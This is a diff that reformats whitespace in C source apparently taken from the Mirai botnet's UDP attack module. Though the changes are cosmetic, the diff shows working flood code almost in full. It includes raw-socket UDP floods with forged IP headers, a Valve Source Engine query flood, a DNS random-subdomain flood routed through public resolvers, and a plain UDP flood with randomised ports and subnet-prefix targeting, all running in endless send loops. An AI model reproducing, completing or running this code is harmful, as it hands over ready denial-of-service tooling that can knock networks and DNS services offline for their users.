@@ -25,7 +25,7 @@ static ipv4_t get_dns_resolver(void);
 void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    char **pkts = calloc(targs_len, sizeof(char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -47,7 +47,7 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
         return;
     }
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
@@ -61,14 +61,14 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
         struct iphdr *iph;
         struct udphdr *udph;
 
-        pkts[i] = calloc(1510, sizeof (char));
+        pkts[i] = calloc(1510, sizeof(char));
         iph = (struct iphdr *)pkts[i];
         udph = (struct udphdr *)(iph + 1);
 
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -79,7 +79,7 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
 
         udph->source = htons(sport);
         udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + data_len);
+        udph->len = htons(sizeof(struct udphdr) + data_len);
     }
 
     while (TRUE)
@@ -110,18 +110,18 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
                 rand_str(data, data_len);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             udph->check = 0;
-            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);
+            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);
 
             targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        break;
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
 }
@@ -129,7 +129,7 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
 void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    char **pkts = calloc(targs_len, sizeof(char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -150,7 +150,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         return;
     }
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
@@ -165,7 +165,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         struct udphdr *udph;
         char *data;
 
-        pkts[i] = calloc(128, sizeof (char));
+        pkts[i] = calloc(128, sizeof(char));
         iph = (struct iphdr *)pkts[i];
         udph = (struct udphdr *)(iph + 1);
         data = (char *)(udph + 1);
@@ -173,7 +173,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -184,10 +184,10 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
         udph->source = htons(sport);
         udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);
+        udph->len = htons(sizeof(struct udphdr) + 4 + vse_payload_len);
 
         *((uint32_t *)data) = 0xffffffff;
-        data += sizeof (uint32_t);
+        data += sizeof(uint32_t);
         util_memcpy(data, vse_payload, vse_payload_len);
     }
 
@@ -198,7 +198,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct udphdr *udph = (struct udphdr *)(iph + 1);
-            
+
             // For prefix attacks
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
@@ -211,18 +211,18 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
                 udph->dest = rand_next();
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             udph->check = 0;
-            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
+            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
 
             targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        break;
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
 }
@@ -230,7 +230,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    char **pkts = calloc(targs_len, sizeof(char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -260,7 +260,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         return;
     }
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
@@ -279,7 +279,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         char *qname, *curr_lbl;
         struct dns_question *dnst;
 
-        pkts[i] = calloc(600, sizeof (char));
+        pkts[i] = calloc(600, sizeof(char));
         iph = (struct iphdr *)pkts[i];
         udph = (struct udphdr *)(iph + 1);
         dnsh = (struct dnshdr *)(udph + 1);
@@ -288,7 +288,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -299,7 +299,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
         udph->source = htons(sport);
         udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
+        udph->len = htons(sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
 
         dnsh->id = htons(dns_hdr_id);
         dnsh->opts = htons(1 << 8); // Recursion desired
@@ -355,19 +355,19 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             rand_alphastr((uint8_t *)qrand, data_len);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             udph->check = 0;
-            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
+            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
 
             targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
             targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        break;
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
 }
@@ -379,8 +379,8 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
 #endif
 
     int i;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    int *fds = calloc(targs_len, sizeof (int));
+    char **pkts = calloc(targs_len, sizeof(char *));
+    int *fds = calloc(targs_len, sizeof(int));
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
     uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
@@ -390,7 +390,9 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
     if (sport == 0xffff)
     {
         sport = rand_next();
-    } else {
+    }
+    else
+    {
         sport = htons(sport);
     }
 
@@ -404,7 +406,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
         struct udphdr *udph;
         char *data;
 
-        pkts[i] = calloc(65535, sizeof (char));
+        pkts[i] = calloc(65535, sizeof(char));
 
         if (dport == 0xffff)
             targs[i].sock_addr.sin_port = rand_next();
@@ -423,7 +425,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
         bind_addr.sin_port = sport;
         bind_addr.sin_addr.s_addr = 0;
 
-        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
+        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
         {
 #ifdef DEBUG
             printf("Failed to bind udp socket.\n");
@@ -434,7 +436,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
         if (targs[i].netmask < 32)
             targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
-        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
+        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
         {
 #ifdef DEBUG
             printf("Failed to connect udp socket.\n");
@@ -461,7 +463,9 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
             {
                 printf("send failed: %d\n", errno);
-            } else {
+            }
+            else
+            {
                 printf(".\n");
             }
 #else
@@ -469,9 +473,9 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
 #endif
         }
 #ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        break;
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
 }
@@ -488,7 +492,7 @@ static ipv4_t get_dns_resolver(void)
         int ret, nspos;
         char resolvbuf[2048];
 
-        ret = read(fd, resolvbuf, sizeof (resolvbuf));
+        ret = read(fd, resolvbuf, sizeof(resolvbuf));
         close(fd);
         table_unlock_val(TABLE_ATK_NSERV);
         nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
@@ -536,12 +540,12 @@ static ipv4_t get_dns_resolver(void)
     switch (rand_next() % 4)
     {
     case 0:
-        return INET_ADDR(8,8,8,8);
+        return INET_ADDR(8, 8, 8, 8);
     case 1:
-        return INET_ADDR(74,82,42,42);
+        return INET_ADDR(74, 82, 42, 42);
     case 2:
-        return INET_ADDR(64,6,64,6);
+        return INET_ADDR(64, 6, 64, 6);
     case 3:
-        return INET_ADDR(4,2,2,2);
+        return INET_ADDR(4, 2, 2, 2);
     }
 }
